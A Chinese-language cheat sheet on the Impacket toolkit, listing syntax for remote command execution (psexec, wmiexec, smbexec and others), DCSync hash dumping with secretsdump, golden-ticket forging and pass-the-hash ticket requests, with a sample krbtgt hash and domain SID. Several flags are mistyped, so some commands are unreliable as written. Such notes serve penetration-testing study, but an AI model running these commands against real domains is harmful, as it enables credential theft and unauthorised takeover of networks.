<center>Impacket</center>



[toc]







## Impacket

> Impacket 是用于处理网络协议的 Python 类的集合。[github](https://github.com/fortra/impacket)



Impacket 的强大之处在于其高度的对象化API，它使得处理复杂的协议层次结构变得简单。通过这个库，你可以：

* 构造：从零开始创建网络协议的数据包。
* 解析：读取原始数据并解析成对象模型。
* 交互：利用密码、散列、票据或密钥进行NTLM和Kerberos认证。
* 模拟：与各种MSRPC接口进行交互，包括SAMR、SRVS、WKST等。
  



### 1. 安装

```shell
# debian 
sudo apt update
sudo apt install snapd
sudo snap install snapd
sudo systemctl restart snapd
sudo systemctl enable snapd
sudo snap install impacket

# 使用
impacket-命令
```





### 2. 使用

> from [blog ](https://blog.csdn.net/qq_18811919/article/details/129152861) [blog1](https://www.cnblogs.com/ciyze0101/p/15315811.html)

```shell
Impacker是用户处理网络协议的Python类集合,用于对SAB1-3或IPv4/IPv6
上的TCP/UPD/ICMP/IGMP/ARP/IPv4/IPv6/SMB/MSRPC/NTLM/Kerberos/WMI/LDAP
等进行低级的编程访问,数据包可以从头开始构建,也可以从原始数据包中解析,
面向对象API使用处理协议的深层结构变得简单。
```



#### 1. psexec

```shell
psexec.py是用于远程连接的工具
语法:
	使用明文密码
	administrator	账号
	passrrrr		密码
	psexpc.py administrator:passrrrr@10.211.55.33
	使用密码Hash
	impacket-psexec administrator@10.129.18.192 -hashs xxxxxx
连接原理:
	通过管道上传一个二进制文件到目标机器C:\Windows目录下,
	并在远程目标机器上创建一个服务,然后通过服务运行二进制文件,
	运行结束后删除服务和二进制文件,由于创建或删除服务会产生大量的日志,
	因此会在攻击溯源时通过日志反推攻击流程。
连接条件：
	需要目标开启445端口,IPC$和非IPC$的任意可写共享,
	psexec要往目标主机写入二进制文件,默认情况下C$和admin$是开启的。
	
```



#### 2. smbexec

```shell
连接原理:
	smbexec跟psexec很相似是RemComSvc技术的工具，可以在文件共享远程系统中
	创建服务,将运行的命令写在bat脚本中执行,将执行结果写在文件中获取执行命令的输出,
	最后将bat文件和输出文件与服务全部删除,因为会创建服务因此会产生大量的日志。
连接条件:
	使用smbexec连接需要目标开启445端口,IPC$和非IPC$的任意可写共享,
	可以使用除ipc$共享外的所有其他共享，该脚本默认使用C$,可以使用-share参数指定
	其他共享。
连接语法:
	使用明文密码:
		smbexec.py administrator:passrrrr@10.211.55.33
	使用密码Hash
		smbexec.py administrator@10.133.22.22 -hashs xxxxxx
		smbexec.py administrator@10.133.22.22 -hashs xxxxxx	-codec gbk	解决乱码	
		smbexec.py administrator@10.133.22.22 -hashs xxxxxx	-share admin$	指定其他方式共享连接
```



#### 3. wmiexec

```shell
该脚本主要通过WMI实现远程执行,躲避杀软最好。
连接条件:
	需要目标开启135和445端口,并且依赖于admin$,
	135端口用于执行命令,445端口用于读取回显。
连接语法:
	使用明文密码:
	wmiexec.py administrator:passrrrr@10.211.55.33
	使用密码Hash
	wmiexec.py administrator@10.133.22.22 -hashs xxxxxx
	wmiexec.py administrator@10.133.22.22 -hashs xxxxxx	-codec gbk	解决乱码	

```



#### 4. atexec

```shell
通过脚本执行计划任务在主机上实现命令执行,并返回执行后的输出结果。
连接语法:
	使用明文密码:
	atexec.py administrator:passrrrr@10.211.55.33 whoami(执行的命令)
	使用密码Hash
	atexec.py administrator@10.133.22.22 whoami -hashs xxxxxx
	atexec.py administrator@10.133.22.22 whoami -hashs xxxxxx	-codec gbk	解决乱码	

```



#### 5. dcomexec

```shell
通过DCOM在目标上实现命令执行,并返回命令执行后结果
连接语法:
	使用明文密码:
	dcomexec.py administrator:passrrrr@10.211.55.33 whoami(执行的命令)
	使用密码Hash
	dcomexec.py administrator@10.133.22.22 whoami -hashs xxxxxx
	dcomexec.py administrator@10.133.22.22 whoami -hashs xxxxxx	-codec gbk	解决乱码	

```





#### 6. smbclient

```shell
该脚本用于向服务器上传文件
连接成功后的命令:
	info	查看信息
	shares	查看开启的共享
	use xx	使用指定的共享
	ls		查看当前路径
	cd 		切换目录
	put xx	上传文件
	get xx 	下载文件
连接语法（工作组）:
	smbclient.py administrator:passrrrr@10.210.22.3
	smbclient.py administrator@10.133.22.22 -hashs xxxxxx:xxxxx
连接语法（域环境）
	smbclient.py test/administrator:passrrrr@10.210.22.3
	smbclient.py test/administrator@10.133.22.22 -hashs xxxxxx:xxxxx

```





#### 7. secretsdump

```shell
该脚本是利用DCSync功能导出域内用户Hash,需要连接的账号和密码具有DCSync权限。
获取域内用户所有hash
	secretsdump.py test/administrator:passrrrr@10.210.22.3 -just-dc
使用卷影复制服务导出域内所有hash
	secretsdump.py 	test/administrator:passrrrr@10.210.22.3 -use-vss
获取域内指定krbtgt用户的Hash
	secretsdump.py 	test/administrator:passrrrr@10.210.22.3 -just-dc-user "test\krbtgt"

```





#### 8. lookupsid

```shell
10.210.22.3域控IP
lookupsid.py test/administrator:passrrrr@10.210.22.3 -just-dc-user --domain-sids

```





#### 9. ticketer

```shell
如果已知目标域krbtgt用户Hash和目标域的SID，则可以利用该脚本执行如下命令生成黄金票据。
krbtgt Hash:
	krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66b71cfe5adbef5ec5ce4d80c78bc6c9:::
域SID:
	S-1-5-21-1873282888-450677352-877677906
生成黄金票据:
	ticketer.py -domain-sid S-1-5-21-1873282888-450677352-877677906 -nthash 66b71cfe5adbef5ec5ce4d80c78bc6c9 -domain test.com administrator

```





#### 10. getTGT

```shell
密码另外输入可以在特殊字符的密码情况下使用
getTGT.py test/administrator@10.21.33.4 -dc-ip 10.21.33.4 -debug
直接使用明文密码
getTGT.py test/administrator:Password123@10.21.33.4 -dc-ip 10.21.33.4 -debug
使用ntlm hash请求TGT
getTGT.py test.com/administrator:@10.211.55.4 -hashes aad3b435b51404eeaad3b435b51404ee:443304af5a35f12b9ff7ecc74adc5a27

```

